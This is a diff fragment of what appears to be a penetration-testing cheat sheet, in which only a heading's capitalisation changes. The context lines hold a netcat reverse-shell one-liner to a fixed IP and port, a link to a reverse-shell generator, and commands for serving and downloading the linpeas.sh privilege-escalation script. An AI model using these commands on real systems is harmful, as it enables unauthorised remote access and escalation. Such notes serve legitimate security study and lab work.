@@ -21,7 +21,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.14.85.242 9001 >/tmp/f
 ```
 ### [Other_Reverse_Shell_Site](https://www.revshells.com/)
 
-# file_transfer ✅
+# File_Transfer ✅
 ```bash
 python3 -m http.server 8000
 wget http://0.0.0.0:8000/linpeas.sh
